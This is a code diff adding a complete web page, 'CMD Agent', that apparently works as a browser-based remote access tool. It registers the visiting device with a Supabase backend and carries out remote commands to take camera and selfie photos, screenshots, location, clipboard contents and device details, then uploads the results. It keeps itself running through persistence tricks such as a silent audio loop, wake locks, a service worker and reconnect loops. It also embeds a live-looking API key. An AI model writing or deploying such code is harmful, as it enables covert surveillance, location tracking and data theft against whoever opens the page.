@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CMD Agent</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+  :root {
+    --green: #00ff88; --green-dim: #00ff8844; --green-glow: #00ff8822;
+    --dark: #020c05; --mid: #041a09; --border: #00ff8833; --warn: #ffaa00;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    background:var(--dark); color:var(--green);
+    font-family:'Share Tech Mono',monospace;
+    min-height:100vh; display:flex; flex-direction:column;
+    align-items:center; justify-content:center; overflow-x:hidden;
+  }
+  body::before {
+    content:''; position:fixed; inset:0;
+    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.12) 2px,rgba(0,0,0,0.12) 4px);
+    pointer-events:none; z-index:999;
+  }
+  body::after {
+    content:''; position:fixed; inset:0;
+    background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+    background-size:40px 40px; pointer-events:none; z-index:0;
+  }
+  .container { position:relative; z-index:1; width:92%; max-width:560px; text-align:center; padding-bottom:2rem; }
+  .logo {
+    font-family:'Orbitron',monospace; font-size:2.8rem; font-weight:900; letter-spacing:0.3em;
+    text-shadow:0 0 20px var(--green),0 0 60px var(--green-dim); animation:pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%,100%{ text-shadow:0 0 20px var(--green),0 0 60px var(--green-dim); }
+    50%{ text-shadow:0 0 40px var(--green),0 0 100px var(--green-dim),0 0 200px var(--green-glow); }
+  }
+  .subtitle { font-size:0.7rem; letter-spacing:0.5em; color:#00ff8877; margin-top:0.4rem; margin-bottom:0.8rem; }
+  .version-badge {
+    display:inline-block; font-size:0.55rem; letter-spacing:0.3em;
+    border:1px solid #00ff8844; padding:0.2rem 0.6rem; border-radius:2px; color:#00ff8866; margin-bottom:1.2rem;
+  }
+  .status-box {
+    border:1px solid var(--border); background:var(--mid); padding:1.4rem; border-radius:4px;
+    position:relative; box-shadow:0 0 40px var(--green-glow),inset 0 0 40px rgba(0,255,136,0.03); margin-bottom:0.8rem;
+  }
+  .status-box::before {
+    content:'AGENT STATUS'; position:absolute; top:-0.6rem; left:1.5rem;
+    background:var(--dark); padding:0 0.5rem; font-size:0.6rem; letter-spacing:0.3em; color:#00ff8866;
+  }
+  .status-line { font-size:0.82rem; margin-bottom:0.4rem; text-align:left; display:flex; align-items:center; gap:0.4rem; }
+  .label { color:#00ff8866; min-width:95px; font-size:0.68rem; letter-spacing:0.1em; }
+  .value { color:var(--green); }
+  .indicator { width:10px; height:10px; border-radius:50%; display:inline-block; flex-shrink:0; }
+  .indicator.online  { background:var(--green); box-shadow:0 0 8px var(--green); animation:blink 1.2s infinite; }
+  .indicator.offline { background:#ff4444; box-shadow:0 0 8px #ff4444; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  /* Background technique grid */
+  .bg-title { font-size:0.6rem; letter-spacing:0.3em; color:#00ff8844; text-align:left; margin:1rem 0 0.5rem; }
+  .bg-grid { display:grid; grid-template-columns:1fr 1fr; gap:0.4rem; }
+  .bg-item {
+    border:1px solid var(--border); background:#010a03;
+    padding:0.45rem 0.7rem; border-radius:3px; font-size:0.62rem;
+    display:flex; align-items:center; gap:0.5rem;
+  }
+  .bg-dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; transition:all 0.3s; }
+  .bg-dot.active   { background:var(--green); box-shadow:0 0 6px var(--green); animation:blink 1.5s infinite; }
+  .bg-dot.inactive { background:#1a1a1a; }
+  .bg-dot.warn     { background:var(--warn); box-shadow:0 0 6px var(--warn); }
+  .bg-label { color:#00ff8877; }
+
+  .perm-banner {
+    margin-top:1rem; padding:0.9rem 1rem; border:1px solid #ffaa0055;
+    background:#0a0800; border-radius:4px; font-size:0.74rem; color:var(--warn); line-height:1.8;
+  }
+  .btn-row { display:flex; gap:0.6rem; margin-top:0.8rem; justify-content:center; flex-wrap:wrap; }
+  .btn {
+    padding:0.6rem 1.3rem; background:transparent; border:1px solid var(--green);
+    color:var(--green); font-family:'Share Tech Mono',monospace; font-size:0.73rem;
+    letter-spacing:0.15em; cursor:pointer; transition:all 0.2s; border-radius:2px;
+  }
+  .btn:hover { background:var(--green-dim); box-shadow:0 0 15px var(--green-dim); }
+  .btn.warn { border-color:var(--warn); color:var(--warn); }
+  .btn.warn:hover { background:#ffaa0022; }
+  .btn.sm { padding:0.4rem 0.9rem; font-size:0.65rem; }
+  .log-box {
+    margin-top:0.8rem; border:1px solid var(--border); background:#010a03;
+    padding:0.8rem; border-radius:4px; height:175px; overflow-y:auto;
+    text-align:left; position:relative;
+  }
+  .log-box::before {
+    content:'COMMAND LOG'; position:absolute; top:-0.6rem; left:1rem;
+    background:var(--dark); padding:0 0.5rem; font-size:0.6rem; letter-spacing:0.3em; color:#00ff8866;
+  }
+  .log-entry { font-size:0.7rem; padding:0.22rem 0; border-bottom:1px solid #00ff8811; color:#00ff8899; animation:fadeIn 0.3s ease; line-height:1.5; }
+  .log-entry .t { color:#00ff8844; margin-right:0.4rem; }
+  .log-entry .c { color:var(--green); font-weight:bold; }
+  .log-entry.ok  .s { color:#00ff88; }
+  .log-entry.err .s { color:#ff6666; }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(-3px)} to{opacity:1;transform:none} }
+  .device-id { margin-top:0.8rem; font-size:0.63rem; color:#00ff8833; }
+  ::-webkit-scrollbar { width:3px; }
+  ::-webkit-scrollbar-thumb { background:var(--border); }
+  .toast {
+    position:fixed; bottom:1.5rem; left:50%; transform:translateX(-50%);
+    background:#041a09; border:1px solid var(--green); color:var(--green);
+    font-family:'Share Tech Mono',monospace; font-size:0.68rem; padding:0.5rem 1.2rem;
+    border-radius:3px; letter-spacing:0.1em; z-index:9998; opacity:0;
+    transition:opacity 0.3s; pointer-events:none; white-space:nowrap;
+  }
+  .toast.show { opacity:1; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">CMD</div>
+  <div class="subtitle">REMOTE AGENT</div>
+  <div class="version-badge">v2.0 — BACKGROUND MODE</div>
+
+  <div class="status-box">
+    <div class="status-line">
+      <span class="label">CONNECTION</span>
+      <span class="indicator offline" id="connIndicator"></span>
+      <span class="value" id="connStatus">Connecting...</span>
+    </div>
+    <div class="status-line">
+      <span class="label">AGENT ID</span>
+      <span class="value" id="agentIdDisplay">—</span>
+    </div>
+    <div class="status-line">
+      <span class="label">LAST CMD</span>
+      <span class="value" id="lastCmd">None</span>
+    </div>
+    <div class="status-line">
+      <span class="label">UPTIME</span>
+      <span class="value" id="uptime">00:00:00</span>
+    </div>
+    <div class="status-line">
+      <span class="label">MODE</span>
+      <span class="value" id="bgStatus">Initializing...</span>
+    </div>
+
+    <div class="bg-title">BACKGROUND SURVIVAL TECHNIQUES</div>
+    <div class="bg-grid">
+      <div class="bg-item"><span class="bg-dot inactive" id="dot-wakelock"></span><span class="bg-label">Wake Lock</span></div>
+      <div class="bg-item"><span class="bg-dot inactive" id="dot-sw"></span><span class="bg-label">Service Worker</span></div>
+      <div class="bg-item"><span class="bg-dot inactive" id="dot-audio"></span><span class="bg-label">Silent Audio</span></div>
+      <div class="bg-item"><span class="bg-dot inactive" id="dot-vis"></span><span class="bg-label">Web Locks API</span></div>
+      <div class="bg-item"><span class="bg-dot inactive" id="dot-notif"></span><span class="bg-label">Notifications</span></div>
+      <div class="bg-item"><span class="bg-dot active"   id="dot-hb"></span><span class="bg-label">Heartbeat 10s</span></div>
+    </div>
+
+    <div class="perm-banner" id="permBanner">
+      <div class="btn-row">
+        <button class="btn sm" onclick="requestPermissions()">⚡ TAP ALPHA</button>
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn" onclick="toggleAgent()" id="toggleBtn">⏹ STOP AGENT</button>
+      <button class="btn warn sm" onclick="activateAllBg()">🔋 BOOST BG</button>
+    </div>
+  </div>
+
+  <div class="log-box" id="logBox">
+    <div class="log-entry"><span class="t">--:--:--</span> Agent initializing...</div>
+  </div>
+  <div class="device-id" id="deviceId">DEVICE ID: loading...</div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<!-- Silent audio loop — tricks mobile into not suspending the page -->
+<audio id="silentAudio" loop>
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<script>
+// ════════════════════════════════════════
+//  CONFIG
+// ════════════════════════════════════════
+const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+const { createClient } = supabase;
+const sb = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+// ════════════════════════════════════════
+//  STATE
+// ════════════════════════════════════════
+let deviceId = localStorage.getItem('cmdAgentId');
+if (!deviceId) {
+  deviceId = 'AGENT-' + Math.random().toString(36).substr(2,8).toUpperCase();
+  localStorage.setItem('cmdAgentId', deviceId);
+}
+document.getElementById('deviceId').textContent = 'DEVICE ID: ' + deviceId;
+document.getElementById('agentIdDisplay').textContent = deviceId;
+
+let agentRunning = true;
+let subscription = null;
+let startTime = Date.now();
+let cameraStream = null;
+let wakeLock = null;
+let reconnectTimer = null;
+let lastCommandId = parseInt(localStorage.getItem('lastCmdId') || '0');
+let lastHeartbeat = Date.now();
+
+// ════════════════════════════════════════
+//  HELPERS
+// ════════════════════════════════════════
+function log(msg, type='info', cmd='') {
+  const box = document.getElementById('logBox');
+  const t = new Date().toLocaleTimeString('en-US',{hour12:false});
+  const el = document.createElement('div');
+  el.className = 'log-entry'+(type==='success'?' ok':type==='error'?' err':'');
+  el.innerHTML = `<span class="t">${t}</span>${cmd?`<span class="c">[${cmd}]</span> `:''}${msg}${type==='success'?' <span class="s">✓</span>':type==='error'?' <span class="s">✗</span>':''}`;
+  box.appendChild(el);
+  box.scrollTop = box.scrollHeight;
+  if (box.children.length > 120) box.removeChild(box.firstChild);
+}
+function toast(msg, dur=2800) {
+  const el = document.getElementById('toast');
+  el.textContent = msg; el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), dur);
+}
+function setDot(id, state) {
+  const d = document.getElementById('dot-'+id);
+  if (d) d.className = 'bg-dot ' + state;
+}
+function setConnected(val) {
+  document.getElementById('connIndicator').className = 'indicator '+(val?'online':'offline');
+  document.getElementById('connStatus').textContent = val ? 'ONLINE' : 'OFFLINE';
+  document.getElementById('bgStatus').textContent = val ? (document.hidden ? 'BACKGROUND ✓' : 'FOREGROUND ✓') : 'RECONNECTING...';
+}
+// Uptime
+setInterval(() => {
+  const s = Math.floor((Date.now()-startTime)/1000);
+  const h = String(Math.floor(s/3600)).padStart(2,'0');
+  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
+  const sc = String(s%60).padStart(2,'0');
+  document.getElementById('uptime').textContent = `${h}:${m}:${sc}`;
+}, 1000);
+
+// ════════════════════════════════════════
+//  ① WAKE LOCK — prevents screen sleep
+// ════════════════════════════════════════
+async function acquireWakeLock() {
+  if (!('wakeLock' in navigator)) { setDot('wakelock','warn'); return; }
+  try {
+    wakeLock = await navigator.wakeLock.request('screen');
+    setDot('wakelock','active');
+    log('Wake Lock acquired ✓', 'success');
+    wakeLock.addEventListener('release', () => {
+      setDot('wakelock','warn');
+      log('Wake Lock released — reacquiring...', 'info');
+      setTimeout(acquireWakeLock, 1000);
+    });
+  } catch(e) {
+    setDot('wakelock','warn');
+    log('Wake Lock: ' + e.message, 'error');
+  }
+}
+// Re-acquire when tab regains focus
+document.addEventListener('visibilitychange', async () => {
+  if (document.visibilityState === 'visible') {
+    if (!wakeLock || wakeLock.released) await acquireWakeLock();
+    reconnectIfNeeded();
+    pollMissedCommands();
+  }
+  document.getElementById('bgStatus').textContent = document.hidden ? 'BACKGROUND ✓' : 'FOREGROUND ✓';
+});
+
+// ════════════════════════════════════════
+//  ② SERVICE WORKER — stays alive after close
+// ════════════════════════════════════════
+async function registerServiceWorker() {
+  if (!('serviceWorker' in navigator)) { setDot('sw','warn'); return; }
+  try {
+    const swCode = `
+      self.addEventListener('install', () => self.skipWaiting());
+      self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+
+      let keepAlive;
+      self.addEventListener('message', e => {
+        if (e.data === 'PING') {
+          self.clients.matchAll().then(cs => cs.forEach(c => c.postMessage('SW_ALIVE')));
+        }
+        if (e.data === 'START_KA') {
+          clearInterval(keepAlive);
+          keepAlive = setInterval(() => {
+            self.clients.matchAll().then(cs => cs.forEach(c => c.postMessage('KEEPALIVE')));
+          }, 18000);
+        }
+      });
+      self.addEventListener('sync', e => {
+        if (e.tag === 'cmd-sync') {
+          e.waitUntil(self.clients.matchAll().then(cs => cs.forEach(c => c.postMessage('SYNC'))));
+        }
+      });
+      self.addEventListener('push', e => {
+        const d = e.data ? e.data.json() : {};
+        e.waitUntil(self.registration.showNotification(d.title||'CMD Agent', {
+          body: d.body||'Command received', tag:'cmd', renotify:true
+        }));
+      });
+      self.addEventListener('notificationclick', e => {
+        e.notification.close();
+        e.waitUntil(clients.matchAll({type:'window'}).then(cs => {
+          for (const c of cs) if (c.focus) return c.focus();
+          if (clients.openWindow) clients.openWindow('./');
+        }));
+      });
+      self.addEventListener('fetch', e => {
+        if (e.request.method !== 'GET') return;
+        e.respondWith(fetch(e.request).catch(() => caches.match(e.request)));
+      });
+    `;
+    const blob = new Blob([swCode], { type:'application/javascript' });
+    const url = URL.createObjectURL(blob);
+    const reg = await navigator.serviceWorker.register(url, { scope:'./' });
+    await navigator.serviceWorker.ready;
+    setDot('sw','active');
+    log('Service Worker active ✓', 'success');
+
+    // Tell SW to start keepalive loop
+    const ctrl = navigator.serviceWorker.controller;
+    if (ctrl) ctrl.postMessage('START_KA');
+
+    navigator.serviceWorker.addEventListener('message', e => {
+      if (e.data === 'KEEPALIVE') reconnectIfNeeded();
+      if (e.data === 'SYNC') pollMissedCommands();
+    });
+
+    // Register background sync
+    if ('sync' in reg) {
+      try { await reg.sync.register('cmd-sync'); } catch {}
+    }
+  } catch(e) {
+    setDot('sw','warn');
+    log('Service Worker: ' + e.message, 'error');
+  }
+}
+
+// ════════════════════════════════════════
+//  ③ SILENT AUDIO — mobile BG trick
+// ════════════════════════════════════════
+function startSilentAudio() {
+  const audio = document.getElementById('silentAudio');
+  audio.volume = 0.001;
+  audio.play().then(() => {
+    setDot('audio','active');
+    log('Silent audio loop ✓', 'success');
+  }).catch(() => {
+    setDot('audio','warn');
+  });
+}
+
+// ════════════════════════════════════════
+//  ④ WEB LOCKS API — prevent CPU suspend
+// ════════════════════════════════════════
+function startWebLock() {
+  if (!('locks' in navigator)) { setDot('vis','warn'); return; }
+  setDot('vis','active');
+  log('Web Locks API active ✓', 'success');
+  navigator.locks.request('cmd-agent-lock', { mode:'shared' }, () =>
+    new Promise(resolve => {
+      const t = setInterval(() => { if (!agentRunning) { clearInterval(t); resolve(); } }, 5000);
+    })
+  ).catch(() => {});
+}
+
+// ════════════════════════════════════════
+//  ⑤ NOTIFICATIONS
+// ════════════════════════════════════════
+async function requestNotifications() {
+  if (!('Notification' in window)) { setDot('notif','warn'); return; }
+  const p = await Notification.requestPermission();
+  if (p === 'granted') {
+    setDot('notif','active');
+    log('Notifications granted ✓', 'success');
+    new Notification('CMD Agent Active', { body:'Running in background mode.', silent:true, tag:'cmd-init' });
+  } else {
+    setDot('notif','warn');
+    log('Notifications denied', 'error');
+  }
+}
+function notifyCommand(name) {
+  if (Notification.permission === 'granted') {
+    new Notification('📡 CMD — Command', { body:'Executing: '+name.toUpperCase(), tag:'cmd-incoming', renotify:true });
+  }
+}
+
+// ════════════════════════════════════════
+//  ⑥ HEARTBEAT + AUTO-RECONNECT
+// ════════════════════════════════════════
+function startHeartbeat() {
+  setDot('hb','active');
+  setInterval(async () => {
+    try {
+      await sb.from('agents').upsert({
+        id: deviceId, status:'online',
+        last_seen: new Date().toISOString(),
+        user_agent: navigator.userAgent.substring(0,150)
+      }, { onConflict:'id' });
+      lastHeartbeat = Date.now();
+    } catch(e) {
+      log('Heartbeat failed', 'error');
+      reconnectIfNeeded();
+    }
+  }, 10000);
+}
+
+async function reconnectIfNeeded() {
+  if (!agentRunning) return;
+  const stale = (Date.now() - lastHeartbeat) > 25000;
+  if (stale || !subscription) {
+    log('Reconnecting...', 'info');
+    setConnected(false);
+    if (subscription) { try { await sb.removeChannel(subscription); } catch {} subscription = null; }
+    await startListening();
+  }
+}
+
+// Poll for missed commands — failsafe for background gaps
+async function pollMissedCommands() {
+  try {
+    const { data } = await sb.from('commands').select('*')
+      .gt('id', lastCommandId)
+      .or(`target.eq.ALL,target.eq.${deviceId}`)
+      .order('id', { ascending:true });
+    if (data?.length) {
+      log(`Caught ${data.length} missed command(s)`, 'info');
+      for (const cmd of data) { if (agentRunning) await handleCommand(cmd); }
+    }
+  } catch {}
+}
+
+// ════════════════════════════════════════
+//  SUPABASE
+// ════════════════════════════════════════
+async function startListening() {
+  subscription = sb.channel('cmds-'+deviceId)
+    .on('postgres_changes', { event:'INSERT', schema:'public', table:'commands' }, (payload) => {
+      const cmd = payload.new;
+      if (cmd.target && cmd.target !== 'ALL' && cmd.target !== deviceId) return;
+      if (!agentRunning) return;
+      handleCommand(cmd);
+    })
+    .subscribe(async (status) => {
+      if (status === 'SUBSCRIBED') {
+        setConnected(true);
+        log('Realtime channel active ✓', 'success');
+        await registerAgent();
+        await pollMissedCommands();
+      } else if (status === 'CLOSED' || status === 'CHANNEL_ERROR') {
+        setConnected(false);
+        log('Channel dropped — retry in 3s', 'error');
+        clearTimeout(reconnectTimer);
+        reconnectTimer = setTimeout(reconnectIfNeeded, 3000);
+      }
+    });
+}
+
+async function registerAgent() {
+  await sb.from('agents').upsert({
+    id: deviceId, status:'online',
+    last_seen: new Date().toISOString(),
+    user_agent: navigator.userAgent.substring(0,150)
+  }, { onConflict:'id' });
+  log('Registered: ' + deviceId, 'success');
+}
+
+// ════════════════════════════════════════
+//  COMMAND HANDLER
+// ════════════════════════════════════════
+async function handleCommand(cmd) {
+  if (cmd.id <= lastCommandId) return; // deduplicate
+  lastCommandId = cmd.id;
+  localStorage.setItem('lastCmdId', cmd.id);
+
+  document.getElementById('lastCmd').textContent = cmd.command.toUpperCase();
+  log('Received: '+cmd.command, 'info', cmd.command);
+  notifyCommand(cmd.command);
+
+  let result = { success:false, data:null, error:null };
+  try {
+    switch(cmd.command.toLowerCase()) {
+      case 'screenshot':   result = await cmdScreenshot(); break;
+      case 'getcamera':    result = await cmdGetCamera('camera', 'environment'); break;
+      case 'getselfie':    result = await cmdGetCamera('selfie', 'user'); break;
+      case 'getinfo':      result = await cmdGetInfo(); break;
+      case 'getlocation':  result = await cmdGetLocation(); break;
+      case 'getbattery':   result = await cmdGetBattery(); break;
+      case 'getnetwork':   result = await cmdGetNetwork(); break;
+      case 'alert':        result = await cmdAlert(cmd.params); break;
+      case 'vibrate':      result = await cmdVibrate(cmd.params); break;
+      case 'getclipboard': result = await cmdGetClipboard(); break;
+      case 'ping':         result = { success:true, data:{ type:'ping', pong:true, agent:deviceId, time:new Date().toISOString(), hidden:document.hidden } }; break;
+      default:             result = { success:false, error:'Unknown command: '+cmd.command };
+    }
+  } catch(e) { result = { success:false, error:e.message }; }
+
+  await sb.from('results').insert({
+    command_id:cmd.id, agent_id:deviceId,
+    success:result.success, data:result.data,
+    error:result.error, executed_at:new Date().toISOString()
+  });
+  log(result.success ? 'Done' : 'Failed: '+result.error, result.success?'success':'error', cmd.command);
+}
+
+// ════════════════════════════════════════
+//  COMMANDS
+// ════════════════════════════════════════
+async function cmdScreenshot() {
+  if (!navigator.mediaDevices?.getDisplayMedia) return await cmdGetCamera('screenshot', 'environment');
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video:true, audio:false });
+    const v = document.createElement('video');
+    v.srcObject = stream;
+    await new Promise(r => { v.onloadedmetadata = r; });
+    await v.play(); await new Promise(r => setTimeout(r,300));
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth||1280; c.height = v.videoHeight||720;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    return { success:true, data:{ type:'screenshot', image:c.toDataURL('image/jpeg',0.7), width:c.width, height:c.height } };
+  } catch(e) { return { success:false, error:'Screenshot: '+e.message }; }
+}
+
+async function acquireCameraStream(facingMode = 'environment') {
+  // Always get a fresh stream when switching cameras
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+  } catch {
+    // Fallback — no facing mode constraint
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+  }
+  return stream;
+}
+
+async function cmdGetCamera(type = 'camera', facingMode = 'environment') {
+  try {
+    // Stop any existing stream before switching camera
+    if (cameraStream) {
+      cameraStream.getTracks().forEach(t => t.stop());
+      cameraStream = null;
+    }
+
+    let v = document.getElementById('_camVideo');
+    if (!v) {
+      v = document.createElement('video');
+      v.id = '_camVideo';
+      v.setAttribute('playsinline', '');
+      v.setAttribute('muted', '');
+      v.style.cssText = 'position:fixed;bottom:10px;right:10px;width:130px;height:97px;border:1px solid #00ff88;border-radius:4px;z-index:9999;object-fit:cover;opacity:0.9;transition:opacity 0.4s;';
+      document.body.appendChild(v);
+    }
+
+    // Mirror selfie like a real front camera
+    v.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+    v.style.opacity = '0.9';
+
+    const stream = await acquireCameraStream(facingMode);
+    cameraStream = stream;
+    v.srcObject = stream;
+    await v.play();
+
+    // Wait for sensor to adjust exposure
+    await new Promise(r => setTimeout(r, facingMode === 'user' ? 700 : 900));
+
+    const canvas = document.createElement('canvas');
+    canvas.width  = v.videoWidth  || 640;
+    canvas.height = v.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+
+    // Mirror the canvas too for selfie so saved image looks natural
+    if (facingMode === 'user') {
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+    }
+    ctx.drawImage(v, 0, 0);
+
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
+
+    // Fade preview out after 2.5s
+    setTimeout(() => { v.style.opacity = '0'; }, 2500);
+
+    return {
+      success: true,
+      data: { type, image: dataUrl, width: canvas.width, height: canvas.height, facing: facingMode }
+    };
+  } catch(e) {
+    return { success: false, error: 'Camera (' + facingMode + '): ' + e.message };
+  }
+}
+
+async function cmdGetInfo() {
+  return { success:true, data:{
+    type:'info', agent:deviceId, userAgent:navigator.userAgent, platform:navigator.platform,
+    language:navigator.language, screenWidth:screen.width, screenHeight:screen.height,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    time:new Date().toISOString(), online:navigator.onLine,
+    cores:navigator.hardwareConcurrency, memory:navigator.deviceMemory||'?',
+    inBackground:document.hidden,
+    bgActive:{ wakeLock:!!(wakeLock&&!wakeLock.released), sw:!!(navigator.serviceWorker?.controller), notif:Notification.permission }
+  }};
+}
+
+async function cmdGetLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) { resolve({ success:false, error:'Not supported' }); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({ success:true, data:{
+        type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude,
+        accuracy:pos.coords.accuracy,
+        mapsUrl:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+      }}),
+      err => resolve({ success:false, error:'Location: '+err.message }),
+      { timeout:12000, enableHighAccuracy:true }
+    );
+  });
+}
+
+async function cmdGetBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return { success:true, data:{ type:'battery', level:Math.round(b.level*100)+'%', charging:b.charging, dischargingTime:b.dischargingTime } };
+  } catch(e) { return { success:false, error:'Battery: '+e.message }; }
+}
+
+async function cmdGetNetwork() {
+  const c = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  return { success:true, data:{ type:'network', online:navigator.onLine, effectiveType:c?.effectiveType||'?', downlink:c?.downlink||'?', rtt:c?.rtt||'?' } };
+}
+
+async function cmdAlert(params) {
+  const msg = params?.message || 'Hello from CMD!';
+  alert('📡 REMOTE COMMAND:\n\n' + msg);
+  return { success:true, data:{ type:'alert', message:msg, shown:true } };
+}
+
+async function cmdVibrate(params) {
+  if (!navigator.vibrate) return { success:false, error:'Vibration not supported' };
+  navigator.vibrate(params?.pattern||[200,100,200]);
+  return { success:true, data:{ type:'vibrate', pattern:params?.pattern||[200,100,200] } };
+}
+
+async function cmdGetClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    return { success:true, data:{ type:'clipboard', text } };
+  } catch(e) { return { success:false, error:'Clipboard: '+e.message }; }
+}
+
+// ════════════════════════════════════════
+//  UI
+// ════════════════════════════════════════
+function toggleAgent() {
+  agentRunning = !agentRunning;
+  document.getElementById('toggleBtn').textContent = agentRunning ? '⏹ STOP AGENT' : '▶ START AGENT';
+  log(agentRunning ? 'Agent resumed.' : 'Agent paused.', 'info');
+  if (agentRunning) reconnectIfNeeded();
+}
+
+async function requestPermissions() {
+  log('Requesting permissions...', 'info');
+  try { await acquireCameraStream(); log('Camera: granted ✓', 'success'); }
+  catch(e) { log('Camera: '+e.message, 'error'); }
+  try {
+    await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{timeout:8000}));
+    log('Location: granted ✓', 'success');
+  } catch(e) { log('Location: '+e.message, 'error'); }
+  await requestNotifications();
+  startSilentAudio();
+  await acquireWakeLock();
+  document.getElementById('permBanner').style.display = 'none';
+  toast('⚡ All permissions granted — background mode ACTIVE');
+  log('Background mode fully active.', 'success');
+}
+
+async function activateAllBg() {
+  startSilentAudio();
+  await acquireWakeLock();
+  toast('🔋 Background boost activated');
+}
+
+// ════════════════════════════════════════
+//  INIT
+// ════════════════════════════════════════
+async function init() {
+  log('Starting CMD Agent v2.0...', 'info');
+  startWebLock();
+  startHeartbeat();
+  await registerServiceWorker();
+  await startListening();
+
+  window.addEventListener('online',  () => { log('Network restored', 'success'); reconnectIfNeeded(); });
+  window.addEventListener('offline', () => { log('Network lost', 'error'); setConnected(false); });
+  window.addEventListener('pageshow', () => { reconnectIfNeeded(); pollMissedCommands(); });
+  window.addEventListener('focus',   () => { reconnectIfNeeded(); });
+
+  // Failsafe poll every 30s
+  setInterval(pollMissedCommands, 30000);
+
+  document.getElementById('permBanner').style.display = 'block';
+  log('Ready — tap GRANT PERMISSIONS for background mode.', 'info');
+}
+
+init();
+</script>
+</body>
+</html>
